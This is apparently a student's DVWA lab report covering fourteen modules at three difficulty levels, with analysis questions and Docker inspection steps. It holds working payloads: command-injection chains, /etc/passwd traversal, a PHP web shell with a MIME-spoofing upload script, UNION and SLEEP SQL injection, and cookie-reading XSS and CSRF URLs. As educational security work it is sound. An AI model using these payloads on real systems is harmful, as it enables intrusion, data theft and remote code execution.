# DVWA Security Lab Report

## Table of Contents

1. [Brute Force](#1-brute-force)
2. [Command Injection](#2-command-injection)
3. [CSRF](#3-csrf)
4. [File Inclusion](#4-file-inclusion)
5. [File Upload](#5-file-upload)
6. [Insecure CAPTCHA](#6-insecure-captcha)
7. [SQL Injection](#7-sql-injection)
8. [SQL Injection (Blind)](#8-sql-injection-blind)
9. [Weak Session IDs](#9-weak-session-ids)
10. [XSS (DOM)](#10-xss-dom)
11. [XSS (Reflected)](#11-xss-reflected)
12. [XSS (Stored)](#12-xss-stored)
13. [Content Security Policy (CSP) Bypass](#13-content-security-policy-csp-bypass)
14. [JavaScript](#14-javascript)
15. [Security Level Comparison](#15-security-level-comparison)
16. [Security Analysis Questions](#16-security-analysis-questions)
17. [Docker Inspection Tasks](#17-docker-inspection-tasks)
---

## 1. Brute Force

### Security Level: Low

**Method:** Unlimited login attempts with no delay or lockout.  
**Result:** Credentials `admin` / `password` were successfully brute-forced.  
**Why it worked:** No rate limiting or account lockout mechanisms were implemented.

---

### Security Level: Medium

**Method:** A fixed 2-second delay was introduced between login attempts, but unlimited attempts were still allowed.  
**Result:** Login was eventually successful despite the delay.  
**Why it worked:** The delay slows attacks but does not prevent them. Given enough time, brute force still succeeds.

---

### Security Level: High

**Method:** A random delay (1–3 seconds) was observed, and a CSRF token was present in the login form.  
**Result:** Automated brute-force is significantly more difficult.  
**Why it's harder:** The CSRF token requires a valid session-based token on every request, breaking simple scripted attacks. The random delay further complicates timing-based automation.

![Brute Force – Low](assets/1_A.png)

---

## 2. Command Injection

### Security Level: Low

**Payload:**
```
12345; ls
```

**Result:** Both the `ping` command and `ls` executed, returning directory contents (`help`, `index.php`, `source`).  
**Why it worked:** User input was passed directly to `system()` without sanitization. The semicolon (`;`) terminated the first command and chained a second.

![Command Injection – Low](assets/2_A.png)

---

### Security Level: Medium

**Payload:**
```
123456 | ls
```

**Result:** Directory contents were still returned (`help`, `index.php`, `source`).  
**Why it worked:** The application filtered semicolons but left the pipe operator (`|`) unblocked. Incomplete filtering is effectively no filtering - the attack still succeeded via a different shell operator.

![Command Injection – Medium](assets/2_B.png)

---

### Security Level: High

**Payload:**  
123456 |ls

**Result:**  
The directory contents were displayed (help, index.php, source), showing that the injected command executed successfully.

**Why It Worked:**  
The application attempted to filter dangerous characters using a blacklist. However, it mistakenly filtered `"| "` (pipe followed by a space) instead of the pipe character itself. Since the payload used `|ls` without a space, the filter did not remove it, allowing command injection to occur.

![Command Injection – High](assets/2_C.png)

---

## 3. CSRF

### Security Level: Low

**Exploit URL:**
```
http://localhost:8080/vulnerabilities/csrf/?password_new=bruhmoment&password_conf=bruhmoment&Change=Change#
```

**Result:** Password was changed successfully without requiring the current password or any token.  
**Why it worked:** No CSRF token or origin validation was present. The GET request was trusted unconditionally - any crafted link could trigger the action if the victim was logged in.

![CSRF – Low](assets/3_A.png)

---

### Security Level: Medium

**Method:** Chained Reflected XSS to send a same-origin request, bypassing the Referer header check.

**XSS Payload:**
```html
<script>
fetch("/vulnerabilities/csrf/?password_new=bruhmomentum&password_conf=bruhmomentum&Change=Change");
</script>
```

**Result:** Password was changed successfully.  
**Why it worked:** The application only validates the HTTP `Referer` header. Since the request originated from `localhost` via XSS injection, the referer check passed. No actual CSRF token was required.

![CSRF – Medium](assets/3_B.png)

---

### Security Level: High

**Method:** Extracted the valid `user_token` from the DOM using browser developer tools and appended it to the forged request URL.

**Crafted URL:**
```
http://localhost:8080/vulnerabilities/csrf/index.php?password_new=12345&password_conf=12345&Change=Change&user_token=460ab57d8fdb0e8f1c12741d008c71f8
```

**Result:** Password was changed successfully.  
**Why it worked:** The application validates a session-based CSRF token, which is the correct approach. However, if an attacker can execute JavaScript in the victim's browser (e.g., via XSS), they can extract the token from the DOM and include it in a forged request - bypassing the protection entirely.

![CSRF – High](assets/3_C.png)

---

## 4. File Inclusion

### Security Level: Low

**Payload:**
```
?page=../../../../../../etc/passwd
```

**Result:** The contents of `/etc/passwd` were displayed.  
**Why it worked:** User input was passed directly to `include()` with no validation. Directory traversal sequences (`../`) allowed navigation outside the web root, resulting in Local File Inclusion (LFI).

![File Inclusion – Low](assets/4_A.png)

---

### Security Level: Medium

**Payloads:**
```
?page=..//..//..//..//..//..//etc/passwd
?page=....//....//....//....//....//....//etc/passwd
```

**Result:** The contents of `/etc/passwd` were displayed.  
**Why it worked:** The application removes the literal string `"../"` but does not apply the filter recursively. Patterns like `"..//"` and `"....//"` survive the filter and still resolve to valid traversal paths because the OS treats multiple slashes as a single slash.

![File Inclusion – Medium](assets/4_B.png)

---

### Security Level: High

**Payload:**
```
?page=file:///etc/passwd
```

**Result:** The contents of `/etc/passwd` were displayed.  
**Why it worked:** The application uses `fnmatch("file*", $file)` to validate input, meaning any value beginning with `"file"` is accepted. The `file://` URI scheme is a valid PHP stream wrapper that allows direct access to local filesystem paths - bypassing the intended restriction entirely.

![File Inclusion – High](assets/4_C.png)

---

## 5. File Upload

### Security Level: Low

**Payload:** `shell.php` containing:
```php
<?php system($_REQUEST['cmd']); ?>
```

**Execution URL:**
```
/hackable/uploads/shell.php?cmd=ls
```

**Result:** The server executed `ls` and returned the contents of the uploads directory.  
**Why it worked:** No file type restrictions were enforced. The PHP file was uploaded to a web-accessible directory and interpreted directly by the server, resulting in Remote Code Execution (RCE).

![File Upload – Low](assets/5_A.png)

---

### Security Level: Medium

**Method:** A Python script spoofed the MIME type as `image/jpeg` to bypass the server's content type check.

**Script Used:**
```python
import requests

url = "http://localhost:8080/vulnerabilities/upload/"

cookies = {
    "PHPSESSID": "YOUR_SESSION_ID",
    "security": "medium"
}

shell_code = "<?php system($_REQUEST['cmd']); ?>"

files = {
    "uploaded": ("mediumshell.php", shell_code, "image/jpeg")
}

data = {
    "MAX_FILE_SIZE": "100000",
    "Upload": "Upload"
}

response = requests.post(url, files=files, data=data, cookies=cookies)

if "succesfully uploaded" in response.text.lower():
    print("Success: mediumshell.php uploaded.")
else:
    print("Upload failed.")
```

**Execution URL:**
```
http://localhost:8080/hackable/uploads/mediumshell.php?cmd=ls
```

**Result:** The `ls` command executed and returned directory contents.  
**Why it worked:** The server only checks the MIME type sent in the HTTP request header - not the actual file contents. Spoofing `image/jpeg` satisfies the check while the file remains a fully functional PHP shell.

![File Upload – Medium](assets/5_B.png)

---

### Security Level: High

**Payload:** A valid JPEG image with PHP code appended to it, saved as `highshell.jpg`.

**Upload Result:** Passed all server-side checks:
- Extension: `.jpg` ✓
- File size: < 100KB ✓
- `getimagesize()` confirmed valid image ✓

**Execution Method:** The `.jpg` extension prevented direct execution. However, the **File Inclusion** vulnerability was chained to include and execute the uploaded file:

```
http://localhost:8080/vulnerabilities/fi/?page=../../hackable/uploads/highshell.jpg&cmd=ls
```

**Result:** The command executed and returned directory contents.  
**Why it worked:** The server verifies the image format but not whether PHP code is embedded within it. When the file is loaded via File Inclusion, PHP interprets the embedded code - demonstrating how chaining two vulnerabilities can bypass each individual control.

![File Upload – High](assets/5_C.png)

---

## 6. Insecure CAPTCHA

### Security Level: Low

**Steps:**
1. Opened the CAPTCHA module page.
2. Right-clicked and selected **Inspect Element**.
3. Located the hidden step field:
```html
<input type="hidden" name="step" value="1">
```
4. Changed `value="1"` to `value="2"`.
5. Clicked **Change**.

**Result:** Password was changed without solving the CAPTCHA.  
**Why it worked:** CAPTCHA validation was performed entirely client-side. The server trusted the submitted `step` value without independent verification.

![Insecure CAPTCHA – Low](assets/6_A.png)

---

### Security Level: Medium

**Steps:**
1. Opened the CAPTCHA module and right-clicked → **Inspect**.
2. Located the hidden step field and changed it:
```html
<input type="hidden" name="step" value="2">
```
3. Added a new hidden field below it:
```html
<input type="hidden" name="passed_captcha" value="true">
```
4. Entered a new password in both fields and clicked **Change**.

**Result:** Password was changed without solving the CAPTCHA.  
**Why it worked:** The Medium level introduces a `passed_captcha` flag, but stores it as a client-side hidden field. Since the server trusts the client's submission of this flag, setting it to `true` via browser inspection bypasses the check entirely.

![Insecure CAPTCHA – Medium](assets/6_B.png)

---

### Security Level: High

**Steps:**
1. Opened the CAPTCHA page, filled in `password_new` and `password_conf`.
2. Opened Developer Tools → **Network** tab and submitted the form once to capture the request.
3. Modified the request: set the CAPTCHA value to `hidd3n_valu3`.
4. Spoofed the `User-Agent` header to `reCAPTCHA`.
5. Resent the modified request.

**Result:** Password was changed successfully.  
**Why it worked:** The application contains leftover development logic that grants CAPTCHA bypass when a specific hardcoded value and matching `User-Agent` are present in the request.

![Insecure CAPTCHA – High](assets/6_C1.png)
![Insecure CAPTCHA – High](assets/6_C2.png)

---

## 7. SQL Injection

### Security Level: Low

**Payload:**
```sql
1' UNION SELECT user, password FROM users #
```

**Result:** Usernames and password hashes were returned from the `users` table.  
**Why it worked:** User input was inserted directly into the SQL query without sanitization. The `UNION SELECT` statement appended a second query, extracting data from a separate table.

![SQL Injection – Low](assets/7_A.png)

---

### Security Level: Medium

**Payload:**
```sql
1 UNION SELECT user, password FROM users #
```

**Method:** The interface uses a dropdown, restricting direct input. The option value was modified using **Inspect Element** and then submitted.

**Result:** All usernames and password hashes were returned (`admin`, `gordonb`, `1337`, `pablo`, `smithy`).  
**Why it worked:** The server trusts the value submitted by the client regardless of how the interface presents it. Modifying the DOM to inject a payload bypasses the UI restriction while the underlying query remains vulnerable.

![SQL Injection – Medium](assets/7_B.png)

---

### Security Level: High

**Payload:**
```sql
1' UNION SELECT user, password FROM users #
```

**Method:** The **"Change your ID"** link opens a separate input page. The value entered there is stored in a session variable and used in the main query.

**Result:** Usernames and password hashes were returned.  
**Why it worked:** Although input is no longer a direct GET parameter, the session-stored value is still inserted into the SQL query without sanitization or prepared statements. The injection point moved - but the vulnerability remained.

![SQL Injection – High](assets/7_C.png)

---

## 8. SQL Injection (Blind)

### Security Level: Low

**Payload:**
```sql
1' AND SLEEP(5) #
```

**Result:** Page response was delayed by ~5 seconds, then returned "User ID is MISSING from the database."  
**Why it worked:** The injected `SLEEP(5)` function was executed by the database. The observable delay confirms that the SQL was interpreted - a classic time-based Blind SQL Injection.

![SQL Injection (Blind) – Low](assets/8_A.png)

---

### Security Level: Medium

**Payload:**
```sql
1 AND SLEEP(5)
```

**Method:** Modified the dropdown input via **Inspect Element** to allow manual payload entry.

**Result:** Page response was delayed by ~5 seconds.  
**Why it worked:** Despite the dropdown UI, the submitted value is still inserted directly into the SQL query. The delay confirms successful injection, same as Low - only the interface differed.

![SQL Injection (Blind) – Medium](assets/8_B.png)

---

### Security Level: High

**Payload:**
```sql
1' AND SLEEP(5) #
```

**Method:** Entered via the **"Change your ID"** secondary input page (same approach as regular SQL Injection – High).

**Result:** Page response was delayed by ~5 seconds.  
**Why it worked:** The session-stored ID is still inserted into the query unsanitized, identical to the High level of regular SQL Injection. The only difference is the payload - `SLEEP(5)` instead of `UNION SELECT` - confirming the injection through timing rather than visible output.

![SQL Injection (Blind) – High](assets/8_C.png)

---

## 9. Weak Session IDs

### Security Level: Low

**Method:** Clicked **Generate** repeatedly and observed the `dvwaSession` cookie values.

**Result:** Session IDs incremented sequentially (1, 2, 3, 4...).  
**Why it's a vulnerability:** A sequential counter is trivially predictable. An attacker could enumerate valid session IDs and hijack active user sessions.

![Weak Session IDs – Low](assets/9_A.png)

---

### Security Level: Medium

**Method:** Generated multiple session IDs and recorded their values.

**Result:** Each session ID corresponded to the current Unix timestamp at the moment of generation.  
**Why it's a vulnerability:** Unix timestamps are predictable and increase monotonically. An attacker can approximate when a session was created and enumerate timestamps in that window to guess valid IDs.

![Weak Session IDs – Medium](assets/9_B.png)

---

### Security Level: High

**Observation:** The `dvwaSession` cookie did not change when clicking **Generate** - it retained the value from earlier tests.

**Result:** New session ID values could not be captured or analyzed for this level.  
**Note:** This appears to be an environment-specific issue. The cookie was not being regenerated during testing, which prevented analysis of the High difficulty implementation. Normally, High difficulty uses an MD5 hash combining the counter and timestamp, which is still predictable if either component can be approximated.

![Weak Session IDs – High](assets/9_C.png)

---

## 10. XSS (DOM)

### Security Level: Low

**Payload:**
```html
<script>alert(document.cookie)</script>
```

**Execution URL:**
```
http://localhost:8080/vulnerabilities/xss_d/?default=<script>alert(document.cookie)</script>
```

**Result:** Alert box displayed the session cookie:
```
PHPSESSID=jvh6b0psja6ugr2i4aheh63t67; security=low
```

**Why it worked:** The application reads the `default` URL parameter and writes it directly into the DOM using JavaScript with no sanitization. The browser interprets the injected `<script>` tag and executes it.

![XSS DOM – Low](assets/10_A.png)

---

### Security Level: Medium

**Payload:**
```html
English></option></select><img src=x onerror=alert(document.cookie)>
```

**Execution URL:**
```
http://localhost:8080/vulnerabilities/xss_d/?default=English></option></select><img src=x onerror=alert(document.cookie)>
```

**Result:** Alert box displayed the session cookie.  
**Why it worked:** The application blocks `<script>` tags but still reflects input into the page. Closing the existing `<select>` element and injecting an `<img>` tag with an `onerror` handler executes JavaScript without using `<script>` at all.

![XSS DOM – Medium](assets/10_B.png)

---

### Security Level: High

**Payload:**
```html
<img src=x onerror=alert(document.cookie)>
```

**Execution URL:**
```
http://localhost:8080/vulnerabilities/xss_d/?default=English#<img src=x onerror=alert(document.cookie)>
```

**Result:** Alert box displayed the session cookie:
```
PHPSESSID=jvh6b0psja6ugr2i4aheh63t67; security=high
```

**Why it worked:** At High difficulty, DVWA reads the URL fragment (`#`) client-side rather than the `default` parameter. Fragment identifiers are never sent to the server, so server-side filtering is completely bypassed. The injected `<img onerror>` handler executes in the browser without any server interaction.

![XSS DOM – High](assets/10_C.png)

---

## 11. XSS (Reflected)

### Security Level: Low

**Payload:**
```html
<script>alert(document.cookie)</script>
```

**Result:** Alert box displayed:
```
PHPSESSID=jvh6b0psja6ugr2i4aheh63t67; security=low
```

**Why it worked:** User input from the `name` parameter is reflected directly into the HTML response without encoding or sanitization. The browser parses the injected `<script>` tag as executable code.

![XSS Reflected – Low](assets/11_A.png)

---

### Security Level: Medium

**Payload:**
```html
<ScRipT>alert(document.cookie)</ScRipT>
```

**Result:** Alert box displayed:
```
PHPSESSID=jvh6b0psja6ugr2i4aheh63t67; security=medium
```

**Why it worked:** The filter uses `str_replace` to remove the exact lowercase string `<script>`. Mixed-case input (`<ScRipT>`) does not match the filter pattern and passes through unmodified.

![XSS Reflected – Medium](assets/11_B.png)

---

### Security Level: High

**Payload:**
```html
<img src=x onerror=alert(document.cookie)>
```

**Result:** Alert box displayed:
```
PHPSESSID=jvh6b0psja6ugr2i4aheh63t67; security=high
```

**Why it worked:** The High level uses a regex to strip tags containing "script", but JavaScript can execute through HTML event attributes. Since `onerror` does not contain the word "script", the payload bypasses the filter entirely.

![XSS Reflected – High](assets/11_C.png)

---

## 12. XSS (Stored)

### Security Level: Low

**Payload (Message field):**
```html
<script>window.location='https://google.com'</script>
```

**Steps:**
1. Increased the **Message** field `maxlength` attribute to 100 using browser developer tools.
2. Submitted the payload.

**Result:** Every visitor who loads the guestbook is redirected to `https://google.com`.  
**Why it worked:** Input is stored and rendered without sanitization. The `<script>` tag executes on every page load for every user who views the entry.

![XSS Stored – Low](assets/12_A.png)

---

### Security Level: Medium

**Payload (Name field):**
```html
<sCriPt>window.location='https://google.com'</sCriPt>
```

**Steps:**
1. Increased **Name** field `maxlength` to 100 using developer tools.
2. Submitted the entry.

**Result:** Users are redirected upon loading the guestbook.  
**Why it worked:** The filter only strips the exact lowercase `<script>` string. Mixed-case bypasses it, the payload is stored, and executes for all subsequent visitors.

![XSS Stored – Medium](assets/12_B.png)

---

### Security Level: High

**Payload (Name field):**
```html
<img src=x onerror="window.location='https://google.com'">
```

**Steps:**
1. Increased **Name** field `maxlength` to 100 and `size` to 50 using developer tools.
2. Submitted the entry.

**Result:** Users are redirected upon loading the guestbook.  
**Why it worked:** The filter targets `<script>` patterns but does not block other HTML tags or event handlers. The `<img onerror>` vector avoids the word "script" entirely while still executing arbitrary JavaScript.

![XSS Stored – High](assets/12_C.png)

---

## 13. Content Security Policy (CSP) Bypass

### Security Level: Low

**Payload Attempted:**
```
https://pastebin.com/raw/mdVfvY73
```
Paste contained:
```javascript
alert(document.cookie)
```

**Result:** The page refreshed but no JavaScript executed.  
**Why it failed:** The CSP policy permits scripts from `https://pastebin.com`, which should allow loading external JavaScript. However, Pastebin now serves raw pastes with `Content-Type: text/plain`. Modern browsers enforce strict MIME type checking and refuse to execute content not served as `application/javascript`.

![CSP Bypass – Low](assets/13_A.png)

---

### Security Level: Medium

**Payload:**
```html
<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(document.cookie)</script>
```

**Result:** Alert box appeared displaying the session cookie.  
**Why it worked:** The CSP uses a nonce to allow inline scripts:
```
script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA='
```
However, the nonce is static and never rotates between requests. Since it is visible in the page source, an attacker can simply reuse it in a malicious inline script.

![CSP Bypass – Medium](assets/13_B.png)

---

### Security Level: High

**Method:** Directly modified the server-side JSONP endpoint file:
```
/var/www/html/vulnerabilities/csp/source/jsonp.php
```

**Edit Applied:**
```php
// echo $callback . "(" . json_encode($outp) . ")";
echo "alert(document.cookie)";
```

**Result:** Clicking "Solve the sum" triggered an alert displaying the session cookie.  
**Why it worked:** The CSP policy is `script-src 'self'`, which trusts `jsonp.php` because it is same-origin. CSP validates the source URL - not the file's contents. Replacing the JSONP response body with arbitrary JavaScript causes the browser to execute it with full trust.

![CSP Bypass – High](assets/13_C1.png)
![CSP Bypass – High](assets/13_C2.png)

---

## 14. JavaScript

### Security Level: Low

**Steps:**
1. Used **Inspect Element** to remove the `hidden` attribute from the token field:
```html
<input type="hidden" name="token" value="8b479aefbd90795395b3e7089ae0dc09" id="token">
```
2. Entered `success` in the phrase input field.
3. Ran the following in the browser console:
```javascript
generate_token()
```
4. The token field updated with the correct value. Submitted the form successfully.

**Why it worked:** The token generation logic exists entirely in client-side JavaScript and is directly callable from the browser console.

![JavaScript – Low](assets/14_A.png)

---

### Security Level: Medium

**Steps:**
1. Entered `success` in the phrase field and removed `hidden` from the token field.
2. Opened the browser console and ran:
```javascript
do_elsesomething("XX")
```
3. The token field updated automatically. Submitted the form.

**Why it worked:** The JavaScript was moved to an external file (`medium.js`) and minified, but after pretty-printing it, the logic is clear: the token is generated by reversing the string `"XX" + phrase + "XX"`. Since all of this runs client-side, it can be triggered directly from the console.

![JavaScript – Medium](assets/14_B.png)

---

### Security Level: High

**Attempted:** Inspected the `phrase` and `token` fields and attempted to manually reproduce the token through the browser console.

**Result:** Token generation was not successfully reproduced.  
**Why it's harder:** The token generation logic is heavily obfuscated, making it significantly more difficult to read, trace, or call directly from the console compared to the previous levels. Unlike Low and Medium, there is no clearly exposed function to invoke.

![JavaScript – High](assets/14_C.png)

---

## 15. Security Level Comparison

### Brute Force
Low imposes no restrictions - attempts are unlimited and instant. Medium adds a fixed 2-second delay, which slows attacks but still allows them given enough time. High introduces a CSRF token alongside a random delay, making automation meaningfully harder - though not impossible if the token can be extracted.

### Command Injection
Low passes input directly to `system()` with no filtering, making semicolon-chaining trivial. Medium blocks semicolons but leaves the pipe operator open - swapping one character resumes the attack. High filters pipe followed by a space, but omitting the space entirely bypasses it, showing that a near-complete blacklist is still an incomplete one.

### CSRF
Low has no protection - any crafted link triggers the action on a logged-in victim. Medium validates the Referer header, which sounds reasonable until same-origin XSS renders it meaningless. High introduces a proper CSRF token, but if XSS is achievable anywhere on the site, the token can be read from the DOM and replayed.

### File Inclusion
Low passes the filename directly to `include()`, making directory traversal immediate. Medium strips `../` but only once, so patterns like `....//` reassemble into a valid traversal after filtering. High enforces a prefix check, but accepting anything starting with `"file"` inadvertently permits the `file://` URI scheme and full local filesystem access.

### File Upload
Low enforces nothing - a PHP shell uploads and executes without friction. Medium checks the MIME type, but since that value comes from the request header, spoofing `image/jpeg` is sufficient to pass. High adds extension validation and `getimagesize()`, but PHP code embedded in a valid image executes when the file is loaded through the File Inclusion vulnerability.

### Insecure CAPTCHA
Low stores the current step in a hidden client-side field - changing it to `2` skips the CAPTCHA entirely. Medium adds a `passed_captcha` flag, but it lives in the same client-side form, making it equally trivial to set. High moves logic server-side but retains a hardcoded bypass triggered by a specific CAPTCHA value and a spoofed `User-Agent`.

### SQL Injection
Low concatenates input directly into the query - a `UNION SELECT` immediately dumps the users table. Medium replaces the text field with a dropdown, but modifying the option value via DOM inspection bypasses the UI entirely. High routes input through a session variable, adding indirection without adding sanitization - the query remains just as injectable.

### SQL Injection (Blind)
Low confirms injection immediately through a `SLEEP(5)` delay on a direct input field. Medium changes the interface to a dropdown, but the same timing payload works after a quick DOM edit. High mirrors the regular SQL Injection High approach - the session-stored value still reaches the query unsanitized, and the delay confirms it.

### Weak Session IDs
Low uses a simple incrementing counter, making session IDs trivially enumerable. Medium switches to Unix timestamps, which are harder to guess but still monotonically predictable within a known time window. High hashes the counter and timestamp with MD5, adding opacity - but since both inputs remain approximable, the output space is narrower than it appears.

### XSS (DOM)
Low writes the URL parameter directly into the DOM, executing any injected `<script>` without interference. Medium blocks script tags, but breaking out of the existing `<select>` element and injecting an `<img onerror>` handler achieves the same result. High applies server-side filtering, which is bypassed entirely by placing the payload in the URL fragment - a value the server never sees.

### XSS (Reflected)
Low reflects input into the response with no encoding, executing inline scripts immediately. Medium strips the lowercase string `<script>`, which mixed-case input sidesteps without effort. High uses a regex to block script-related tags, but event handler attributes like `onerror` contain no restricted keywords and execute freely.

### XSS (Stored)
Low stores and renders input unsanitized, meaning a single submission affects every subsequent visitor. Medium applies the same lowercase `<script>` strip seen in Reflected - and falls to the same mixed-case bypass, now with persistent impact. High blocks script patterns more aggressively, but `<img onerror>` avoids the filter entirely and persists in the database.

### CSP Bypass
Low whitelists Pastebin as a script source, but Pastebin now serves raw content as `text/plain`, which browsers refuse to execute - the intended attack fails due to an external platform change. Medium introduces a nonce for inline scripts, but the nonce is static and printed in the page source, making it freely reusable. High enforces `script-src 'self'`, which is strong in principle - but directly editing the same-origin JSONP endpoint replaces its output with arbitrary JavaScript the browser executes with full trust.

### JavaScript
Low exposes the token generation function globally, making it directly callable from the browser console. Medium moves the logic to a minified external file, but pretty-printing it reveals a straightforward string reversal that can be replicated or invoked just as easily. High obfuscates the logic significantly, removing any clearly named function and making the token generation process genuinely difficult to trace or reproduce.

---

## 16. Security Analysis Questions

### 1. Why does SQL Injection succeed at Low security?

User input is concatenated directly into the SQL query with zero sanitization. When you submit `1' UNION SELECT user, password FROM users #`, the database receives and executes it as a legitimate query - it has no way to distinguish your injected code from the intended command.

---

### 2. What control prevents it at High?

Nothing meaningful, actually - and that's the point. High difficulty reroutes input through a session variable instead of a direct GET parameter, which adds indirection but no actual protection. The session value still lands in the query unsanitized. The real fix (not implemented at any level in DVWA) would be **prepared statements / parameterized queries**, which separate code from data entirely so injected SQL is treated as a literal string, never as executable code.

---

### 3. Does HTTPS prevent these attacks? Why or why not?

No. HTTPS encrypts data *in transit* between the browser and server - it protects against eavesdropping on the network. Every attack in this report happens *after* the data arrives at the server. SQLi, XSS, CSRF, command injection - all of these exploit how the application processes input, which HTTPS has no visibility into. A well-encrypted connection to a vulnerable app is still a vulnerable app.

---

### 4. What risks exist if this application is deployed publicly?

Several serious ones:

- **Full database compromise** - SQL Injection exposes all usernames, password hashes, and any other stored data
- **Remote Code Execution** - File Upload + File Inclusion chained together gives an attacker a shell on the server
- **Account takeover at scale** - Stored XSS persists in the database and executes for every visitor, enabling mass session hijacking
- **Complete authentication bypass** - Brute Force has no lockout, and Weak Session IDs let attackers enumerate valid sessions without ever knowing a password
- **Server-level access** - Command Injection lets attackers run arbitrary OS commands, potentially pivoting beyond the container
- **Credential theft** - Password hashes exposed via SQLi can be cracked offline (DVWA uses unsalted MD5)

In short: a publicly exposed DVWA instance would be fully compromised within minutes.

---

### 5. OWASP Top 10 Mapping

| Vulnerability | OWASP Top 10 Category |
|---|---|
| SQL Injection | A03: Injection |
| SQL Injection (Blind) | A03: Injection |
| Command Injection | A03: Injection |
| XSS (DOM, Reflected, Stored) | A03: Injection |
| Brute Force | A07: Identification and Authentication Failures |
| Weak Session IDs | A07: Identification and Authentication Failures |
| CSRF | A01: Broken Access Control |
| File Inclusion | A01: Broken Access Control |
| File Upload | A04: Insecure Design |
| Insecure CAPTCHA | A04: Insecure Design |
| CSP Bypass | A05: Security Misconfiguration |
| JavaScript | A08: Software and Data Integrity Failures |

---

## 17. Docker Inspection Tasks

### 1. List Running Containers

**Command:**
```bash
docker ps
```

**Output:**
```
CONTAINER ID   IMAGE                  COMMAND      CREATED      STATUS        PORTS                  NAMES
7b893dbce6ae   vulnerables/web-dvwa   "/main.sh"   2 days ago   Up 14 hours   0.0.0.0:8080->80/tcp   dvwa
```

**Description:** This command shows all the containers currently running on your machine. Here we can see the `dvwa` container is up and running. Notice how port 80 inside the container is mapped to port 8080 on your host machine - that's why you can visit DVWA in your browser at `http://localhost:8080`.

---

### 2. Inspect Container Configuration

**Command:**
```bash
docker inspect dvwa
```

**Output (Excerpt):**
```json
{
  "Name": "/dvwa",
  "Image": "vulnerables/web-dvwa",
  "State": { "Status": "running" },
  "HostConfig": {
    "NetworkMode": "bridge",
    "PortBindings": {
      "80/tcp": [{ "HostPort": "8080" }]
    }
  },
  "NetworkSettings": { "IPAddress": "172.17.0.2" }
}
```

**Description:** Think of `docker inspect` as a way to peek under the hood of your container. It dumps out everything Docker knows about it - network settings, port mappings, status, and more. You can see the container is running and has been assigned the internal IP `172.17.0.2`.

---

### 3. View Container Logs

**Command:**
```bash
docker logs dvwa
```

**Output (Excerpt):**
```
[+] Starting mysql...
Starting MariaDB database server: mysqld.

[+] Starting apache
Starting Apache httpd web server: apache2.

Apache/2.4.25 (Debian) configured -- resuming normal operations
172.17.0.1 - - "GET /login.php HTTP/1.1" 200
```

**Description:** This is basically the container's diary - it shows everything that happened since it started up. You can see MariaDB and Apache both booting successfully, and even the HTTP request that was made when someone loaded the login page.

---

### 4. Access the Container Shell

**Command:**
```bash
docker exec -it dvwa /bin/bash
```

**Description:** This drops you into a live Bash shell inside the container - like SSH-ing into a mini Linux machine. From here you can poke around the filesystem, run commands, and explore the environment directly.

---

### 5. List Application Files

**Command:**
```bash
ls /var/www/html
```

**Output:**
```
CHANGELOG.md  README.md     config        dvwa          favicon.ico   ids_log.php
instructions.php  logout.php  phpinfo.php  security.php  vulnerabilities
COPYING.txt   about.php     docs          external      hackable      index.php
login.php     php.ini       robots.txt    setup.php
```

**Description:** Once inside the container, this lists everything in `/var/www/html` - which is where Apache looks for files to serve. You can see all the DVWA pages here, like `login.php`, `setup.php`, and the `vulnerabilities` folder where all the labs live.

---

### Explanations

**Where Application Files Are Stored**

All of DVWA's files are stored at `/var/www/html` inside the container. This is Apache's web root, meaning anything in this folder can be served up as a webpage. When you visit `http://localhost:8080/login.php`, Apache is grabbing that file straight from this directory.

**What Backend Technology DVWA Uses**

DVWA runs on a classic LAMP stack - which stands for **Linux, Apache, MySQL/MariaDB, and PHP**. PHP handles all the server-side logic, Apache delivers the pages to your browser, and MariaDB stores the data (like users and settings). It's a very common setup you'll see in the real world too.

**How Docker Isolates the Environment**

Docker wraps DVWA and everything it needs into a self-contained container with its own filesystem, processes, and network. This means nothing DVWA does can mess with your host machine or other containers - it's sandboxed. It's also why you need that port mapping (`8080:80`), since the container's network is separate from yours by default.
